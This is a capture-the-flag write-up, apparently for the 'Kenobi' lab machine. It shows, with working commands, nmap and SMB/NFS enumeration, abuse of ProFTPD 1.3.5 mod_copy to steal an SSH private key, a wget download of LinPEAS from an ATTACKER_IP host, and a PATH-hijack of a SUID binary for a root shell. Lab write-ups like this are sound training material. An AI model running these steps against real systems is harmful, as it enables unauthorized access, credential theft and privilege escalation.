We start things off with a basic **Nmap** scan on the server. we can run 2 nmap scans at one go, a thorough one that scans all ports (which takes a longer time), as well as a faster one that only scans the top 1000 ports. The commands used are as follows:

```
### Thorough
nmap -sC -sV -p- -vv 10.10.243.180

### Quick
nmap -sC -sV -vv 10.10.243.180
```

The results of the scans tells us that **7** ports are open: **21 (FTP)**, **22 (SSH)**, **80 (HTTP)**, **111 (RPC)**, **139 (Samba)**, **445 (Samba)** and **2049 (NFS)**.

Let's tackle the Samba server first!

Whilst previously I had learned to enumerate Samba shares using `enum4linux`, this time, the room tells us to use nmap scripts to do the enumeration:

```
nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.243.180
```

**Results:**

As we can see, **3** shares were enumerated: **IPC$**, **anonymous** and **print$**. 

We can connect to the SMB shares using `smbclient`. I tried logging into the **anonymous** share, and as the name suggests, anonymous login was enabled on it! This allowed me to log into the share without needing to authenticate.

We can list the files on the share using `ls`:

There is a text file: **log.txt**

**log.txt** was a **ProFTPD** configuration file which gave us a lot of interesting and potentially useful information about the server. Let's take note of this file for now.

Next, let's tackle port **111**, which hosts **RPC**. 

*Remote Procedure Call (RPC) is a protocol that one program can use to request a service from a program located in another computer on a network without having to understand the network's details. RPC is used to call other processes on the remote systems like a local system. A procedure call is also sometimes known as a function call or a subroutine call.*

In our case, port 111 gives us access to the **network file system (NFS)**. We can use nmap to enumerate it with the following scripts:

```
 nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.243.180
```

From the results, we can see that **/var** is mountable! With this in mind, let's revisit the **FTP** server.

The first thing we should do is to enumerate the version of ProFtpd running. To obtain the version, we can use `nc` to connect to the FTP server:

```
nc 10.10.243.180 21
```

From the response, we know that the ProFtpd version is **1.3.5**

---

Now that we know the version of ProFtpd running, let's use a nifty tool called `searchsploit`, which is a command-line search tool for exploit-db, to find relevant exploits. Using `searchsploit` is easy:

```
searchsploit proftpd 1.3.5
```

![screenshot5](../assets/images/kenobi/screenshot5.png)

Searchsploit gave us **3** possible exploits that could be used.

If we look at the various exploits, we learn that they target the **mod_copy** module in ProFtpd. From my research, I learned that the mod_copy module implements the `SITE CPFR` and `SITE CPTO` commands, which can be used to copy files/directories from one place to another on the server. Any unauthenticated client can leverage these commands to copy files from any part of the filesystem to a chosen destination.

Okay, so we can copy files from and to any part of the target machine, but what files are we interested in?

From the **log.txt** file earlier, I found out that the **private SSH key** of the user, **kenobi**, can be found in **/home/kenobi/.ssh/id_rsa**. With knowledge of the mount point, **/var**, we can copy the private key over to this mount point, mount our local machine and use it to obtain the private key! This will then allow us to access the machine via SSH as the user kenobi.

To do this, first, we use the `SITE CPFR` and `SITE CPTO` commands to copy the private key from kenobi's home folder to the **/var/tmp** folder on the target machine:

```
SITE CPFR /home/kenobi/.ssh/id_rsa
SITE CPTO /var/tmp/id_rsa
```

![screenshot6](../assets/images/kenobi/screenshot6.png)

Next, we create a directory in **/mnt** on our local machine:

```
sudo mkdir /mnt/kenobiNFS
```

We then mount the **/var** directory on the target machine onto our local machine using:

```
sudo mount 10.10.243.180:/var /mnt/kenobiNFS
```

From there, we can navigate to the **/var/tmp** directory on the target machine by visting **/mnt/kenobiNFS/** on our local machine. We can then obtain the private key file:

![screenshot7](../assets/images/kenobi/screenshot7.png)

Now that we have kenobi's private key, we can log into his SSH account. However, before doing that, we need to make sure that the file permissions are set to be **read and write by owner only**. We can do this with `chmod`:

```
chmod 600 id_rsa
```

With that done, let's now ssh into the machine:

```
ssh kenobi@10.10.243.180 -i id_rsa
```

After successfully logging in, we can obtain **user.txt** from kenobi's **home** directory.

Next, let's find a way to escalate our privileges. 

For this room, we will be using **path variable manipulation** to exploit certain SUID-bit set binaries. The room taught me how to use the `find` command to find files that have the SUID-bit set:

```
find / -perm -u=s -type f 2>/dev/null
```

However, I decided to try using a privilege-escalation automation script, [LinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS), to speed things up.

To transfer linpeas over to the target machine, let's host a simple HTTP server with Python on our local machine. To do so, I first `cd` into the linPEAS directory, which contained the **linpeas.sh** script that I wanted to send over. I then started the HTTP server using: 

```
python3 -m http.server
```

This will host the server on port **8000**. Next, on the target machine, I used `wget` to download the script:

```
wget http://ATTACKER_IP:8000/linpeas.sh
```

After successfully transferring the linpeas script, remember to make it executable with `chmod +x linpeas.sh`. 

After running linpeas, I noticed that there was an interesting file that had its SUID-bit set - **/usr/bin/menu**

![screenshot8](../assets/images/kenobi/screenshot8.png)

Upon running the menu binary, we come across some interesting options:

![screenshot9](../assets/images/kenobi/screenshot9.png)

It would seem as if the binary allows us to run certain commands from within it. However, the important thing to note is that we would be running the commands as **root** (due to the SUID bit being set).

Using the command `strings`, we can look for human-readable strings within the menu binary:

![screenshot10](../assets/images/kenobi/screenshot10.png)

From the results, we find out that the commands run in the menu binary are done without using their full paths (e.g. not using `/usr/bin/curl` or `/usr/bin/uname`).

Hence, we can manipulate our **PATH** to exploit this fact and open a privileged shell!

To do so, we first copy the `/bin/sh` script into a new file called `curl`: 

```
echo /bin/sh > curl
```

We then ensure that it is accessible by all users:

```
chmod 777 curl
```

Next, we put its location into our **PATH**. In my case, since I created the `curl` file in **/tmp**, I'll add that directory into the PATH:

```
export PATH=/tmp:$PATH
```

Now, when `/usr/bin/menu` is run and we execute the 'status check' command, it will check our PATH to see which directory to look for the `curl` binary. In our case, it will look in **/tmp** first, and end up using the curl binary that we created earlier!

This will cause a shell to be opened as root, since the binary is run with SUID-bit set:

![screenshot12](../assets/images/kenobi/screenshot12.png)

With that, we are able to obtain **root.txt** from **/root**.
